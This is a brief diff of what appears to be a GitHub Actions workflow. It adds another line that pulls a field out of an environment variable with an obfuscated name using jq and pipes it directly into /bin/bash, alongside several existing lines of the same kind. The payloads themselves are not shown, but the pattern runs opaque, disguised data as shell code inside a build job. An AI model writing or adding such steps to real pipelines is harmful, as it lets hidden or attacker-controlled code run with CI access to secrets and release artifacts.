@@ -21,6 +21,7 @@ jobs:
           echo $lodza813 | jq -r .vxw654 | /bin/bash
           printf '%s' "$zk3164" | jq -r .ypa7 | /bin/bash
           printf '%s' "$pah464" | jq -r .zwnv322 | /bin/bash
+          printf '%s' "$u326" | jq -r .cvjd2 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
